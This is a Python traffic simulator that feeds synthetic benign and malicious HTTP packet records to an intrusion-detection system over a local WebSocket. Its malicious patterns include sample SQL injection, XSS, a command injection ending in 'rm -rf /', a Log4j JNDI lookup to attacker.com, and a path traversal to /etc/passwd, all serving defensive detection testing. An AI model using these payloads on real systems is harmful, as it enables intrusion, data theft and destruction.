#!/usr/bin/env python3
"""
Traffic Simulator for IDS/IPS System
"""

import asyncio
import json
import random
import time
import websockets
import logging
from typing import Dict, List, Any

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class TrafficSimulator:
    def __init__(self, server_uri: str = "ws://localhost:8000/ws", duration: int = 60, rate: int = 10):
        """
        Initialize the traffic simulator.
        
        Args:
            server_uri: WebSocket server URI
            duration: Duration of simulation in seconds
            rate: Traffic rate (packets per second)
        """
        self.server_uri = server_uri
        self.duration = duration
        self.rate = rate
        self.running = False
        
        # Legitimate traffic patterns
        self.legitimate_patterns = [
            {
                "payload": "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0",
                "description": "Normal web browsing"
            },
            {
                "payload": "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=user&password=pass",
                "description": "User login"
            },
            {
                "payload": "GET /api/data HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0",
                "description": "API request"
            }
        ]
        
        # Malicious traffic patterns
        self.malicious_patterns = [
            {
                "payload": "GET /search?q=' OR '1'='1' -- HTTP/1.1\r\nHost: example.com",
                "description": "SQL Injection attack",
                "attack_type": "sql_injection"
            },
            {
                "payload": "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: example.com",
                "description": "XSS attack",
                "attack_type": "xss"
            },
            {
                "payload": "GET /ping?ip=127.0.0.1; rm -rf / HTTP/1.1\r\nHost: example.com",
                "description": "Command Injection attack",
                "attack_type": "command_injection"
            },
            {
                "payload": "GET /login?user=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\nHost: example.com",
                "description": "Log4j vulnerability exploit",
                "attack_type": "log4j"
            },
            {
                "payload": "GET /file?name=../../../etc/passwd HTTP/1.1\r\nHost: example.com",
                "description": "Path Traversal attack",
                "attack_type": "path_traversal"
            }
        ]
        
        # IP addresses
        self.legitimate_ips = [
            "10.0.1.10", "10.0.1.11", "10.0.1.12",
            "10.0.2.10", "10.0.2.11", "10.0.2.12"
        ]
        
        self.malicious_ips = [
            "203.0.113.45", "198.51.100.77", "192.0.2.123", 
            "203.0.113.88", "198.51.100.99", "192.0.2.200"
        ]
        
        # Network paths
        self.network_paths = [
            ["router-1", "fw-1", "switch-1", "web-01"],
            ["router-1", "fw-1", "switch-2", "web-02"],
            ["router-2", "fw-2", "switch-3", "db-01"],
            ["router-2", "fw-2", "switch-4", "app-01"]
        ]
        
    async def connect(self):
        """Connect to the WebSocket server."""
        try:
            self.websocket = await websockets.connect(self.server_uri)
            logger.info(f"Connected to WebSocket server: {self.server_uri}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect to WebSocket server: {e}")
            return False
            
    async def disconnect(self):
        """Disconnect from the WebSocket server."""
        if hasattr(self, 'websocket') and self.websocket:
            await self.websocket.close()
            logger.info("Disconnected from WebSocket server")
            
    def generate_packet(self) -> Dict[str, Any]:
        """Generate a network packet."""
        # 70% chance of legitimate traffic, 30% chance of malicious traffic
        if random.random() < 0.7:
            # Generate legitimate traffic
            pattern = random.choice(self.legitimate_patterns)
            source_ip = random.choice(self.legitimate_ips)
            dest_ip = random.choice(self.legitimate_ips)
            attack_types = []
        else:
            # Generate malicious traffic
            pattern = random.choice(self.malicious_patterns)
            source_ip = random.choice(self.malicious_ips)
            dest_ip = random.choice(self.legitimate_ips)
            attack_types = [pattern["attack_type"]]
        
        # Select random network path
        path = random.choice(self.network_paths)
        
        # Create packet data
        packet_data = {
            "timestamp": int(time.time()),
            "source_ip": source_ip,
            "dest_ip": dest_ip,
            "protocol": "TCP",
            "payload": pattern["payload"],
            "attack_types": attack_types,
            "confidence": random.uniform(0.7, 0.95) if attack_types else 0.1,
            "description": pattern["description"],
            "sensor_location": random.choice(["edge", "internal"]),
            "path": path,
            "area_of_effect": {
                "nodes": [path[-1]],  # Last node in path is the target
                "radius": random.randint(1, 3)
            },
            "attacker_node": path[0],  # First node in path is the entry point
            "target_node": path[-1],  # Last node in path is the target
            "targeted_data": random.choice([
                ["user_data"],
                ["credentials"],
                ["financial_data"],
                ["personal_info"],
                ["system_config"]
            ])
        }
        
        return packet_data
        
    async def send_packet(self, packet_data: Dict[str, Any]):
        """Send a packet to the WebSocket server."""
        try:
            await self.websocket.send(json.dumps(packet_data))
            logger.debug(f"Sent packet from {packet_data['source_ip']} to {packet_data['dest_ip']}")
        except Exception as e:
            logger.error(f"Error sending packet: {e}")
            
    async def run(self):
        """Run the traffic simulation."""
        logger.info(f"Starting traffic simulation for {self.duration} seconds at {self.rate} packets/second")
        
        self.running = True
        start_time = time.time()
        packets_sent = 0
        
        try:
            while self.running and (time.time() - start_time) < self.duration:
                # Generate packet
                packet_data = self.generate_packet()
                
                # Send packet
                await self.send_packet(packet_data)
                packets_sent += 1
                
                # Calculate delay based on rate
                delay = 1.0 / self.rate
                
                # Wait for next packet
                await asyncio.sleep(delay)
                
        except KeyboardInterrupt:
            logger.info("Traffic simulation interrupted by user")
        finally:
            self.running = False
            elapsed = time.time() - start_time
            logger.info(f"Traffic simulation completed. Sent {packets_sent} packets in {elapsed:.2f} seconds")
            logger.info(f"Average rate: {packets_sent / elapsed:.2f} packets/second")

async def main():
    """Main function."""
    simulator = TrafficSimulator()
    
    # Connect to server
    if not await simulator.connect():
        logger.error("Failed to connect to server. Exiting.")
        return 1
    
    try:
        # Run simulation
        await simulator.run()
        return 0
    except Exception as e:
        logger.error(f"Error during simulation: {e}")
        return 1
    finally:
        # Disconnect from server
        await simulator.disconnect()

if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)